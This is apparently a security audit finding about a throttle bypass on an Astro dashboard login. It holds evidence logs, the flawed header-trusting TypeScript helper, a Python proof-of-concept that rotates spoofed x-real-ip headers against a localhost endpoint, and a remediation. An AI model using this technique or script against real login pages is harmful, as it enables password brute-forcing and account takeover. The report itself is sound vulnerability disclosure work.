# Authentication Rate-Limit Bypass in Dashboard Login via Spoofed Proxy Headers

**ID:** vuln-0002
**Severity:** MEDIUM
**Found:** 2026-08-26 13:49:38 UTC
**Target:** /workspace/OrPiRa-portfolio
**Endpoint:** /dashboard/login
**Method:** POST
**CWE:** CWE-307
**CVSS:** 5.3
**Fix Effort:** Low

## Description

The dashboard login endpoint derives its rate-limit key from client-supplied proxy headers, allowing an unauthenticated attacker to rotate `x-real-ip` values and bypass the login throttle. This removes the intended online guessing protection on the administrative login.

## Evidence

Repeated failed logins with one spoofed header value hit the throttle on the sixth request:

```text
Same spoofed IP attempts
1 /dashboard?error=1
2 /dashboard?error=1
3 /dashboard?error=1
4 /dashboard?error=1
5 /dashboard?error=1
6 /dashboard?error=2
```

Rotating only the client-supplied `x-real-ip` header bypassed the throttle and preserved the normal invalid-password response:

```text
Rotating spoofed IP attempts
203.0.113.100 /dashboard?error=1
203.0.113.101 /dashboard?error=1
203.0.113.102 /dashboard?error=1
203.0.113.103 /dashboard?error=1
203.0.113.104 /dashboard?error=1
203.0.113.105 /dashboard?error=1
```

After a local remediation that keyed the limiter to Astro's server-provided `clientAddress`, the same rotated-header sequence was throttled on the sixth request:

```text
Rotating spoofed x-real-ip after patch
203.0.113.110 /dashboard?error=1
203.0.113.111 /dashboard?error=1
203.0.113.112 /dashboard?error=1
203.0.113.113 /dashboard?error=1
203.0.113.114 /dashboard?error=1
203.0.113.115 /dashboard?error=2
```

## Impact

An unauthenticated attacker can make unlimited password attempts against `POST /dashboard/login` by changing spoofed proxy IP headers between requests. This bypasses the only demonstrated brute-force protection on the administrative login and materially weakens the protection of the dashboard session boundary.

## Technical Analysis

The dashboard login route enforces throttling before password verification:

```ts title=src/pages/dashboard/login.ts startLineNumber=30 endLineNumber=43
export const POST: APIRoute = async ({
  request,
  cookies,
  redirect
}) => {

  const form =
    await request.formData();

  const password =
    form.get("password");

  if (isRateLimited(getClientIp(request))) {
    return redirect("/dashboard?error=2", 303);
  }
```

The rate-limit key comes from `getClientIp(request)`, which trusts `x-real-ip` first and then `x-forwarded-for`:

```ts title=src/lib/rate-limit.ts startLineNumber=34 endLineNumber=52
export const getClientIp = (request: Request) => {
	const realIp = request.headers.get("x-real-ip")?.trim();
	if (realIp) {
		return realIp;
	}

	const forwarded = request.headers.get("x-forwarded-for");
	if (forwarded) {
		const candidates = forwarded
			.split(",")
			.map((value) => value.trim())
			.filter(Boolean);

		if (candidates.length > 0) {
			return candidates[candidates.length - 1];
		}
	}

	return "unknown";
};
```

Because these headers are accepted directly from the request, the client controls the limiter key. Reusing one spoofed `x-real-ip` value triggers the limit after five failures, but rotating spoofed values yields a fresh bucket each time and keeps the endpoint in the normal invalid-password path. A local verification patch that bound the limiter to Astro's server-provided `clientAddress` caused the sixth rotated request to return the rate-limit response, confirming the root cause and remediation.

## Proof of Concept

1. Send six same-origin `POST` requests to `http://127.0.0.1:4321/dashboard/login` with an invalid password and the same spoofed `x-real-ip` header value.
2. Observe that attempts `1` through `5` redirect to `/dashboard?error=1`, while attempt `6` redirects to `/dashboard?error=2`.
3. Repeat the test with a fresh series of invalid login attempts, but change the spoofed `x-real-ip` value on every request.
4. Observe that each rotated request redirects to `/dashboard?error=1` instead of reaching `/dashboard?error=2`.
5. Apply the fix that uses Astro's server-side `clientAddress` for the rate-limit key.
6. Repeat the rotated-header sequence and observe that the sixth request is again redirected to `/dashboard?error=2`, showing that header rotation no longer bypasses the throttle.

```python
import requests

url = "http://127.0.0.1:4321/dashboard/login"
base_headers = {
    "Origin": "http://127.0.0.1:4321",
    "Referer": "http://127.0.0.1:4321/dashboard",
    "Content-Type": "application/x-www-form-urlencoded",
}

def attempt(spoofed_ip: str) -> str:
    response = requests.post(
        url,
        headers={**base_headers, "x-real-ip": spoofed_ip},
        data={"password": "wrongpass"},
        allow_redirects=False,
        timeout=10,
    )
    return response.headers.get("Location", "")

print("Same spoofed IP")
for index in range(1, 7):
    print(index, attempt("203.0.113.90"))

print("Rotating spoofed IPs")
for spoofed_ip in [
    "203.0.113.100",
    "203.0.113.101",
    "203.0.113.102",
    "203.0.113.103",
    "203.0.113.104",
    "203.0.113.105",
]:
    print(spoofed_ip, attempt(spoofed_ip))
```

## Remediation

1. Derive the dashboard login rate-limit key from a server-controlled client address, such as Astro's `clientAddress`, instead of directly trusting `x-real-ip` or `x-forwarded-for` from the request.
2. Keep proxy-header parsing behind an explicit trusted-proxy boundary if those headers must be used elsewhere.
3. Re-test the login flow to ensure that repeated failed attempts from the same client are throttled even when proxy headers are rotated.
4. Review other uses of the shared rate-limit helper and update them to use the same server-controlled client identity source where appropriate.

## Assumptions

Assumes the attacker can send unauthenticated requests directly to the dashboard login endpoint and supply arbitrary HTTP headers, which was true for the validated local deployment.
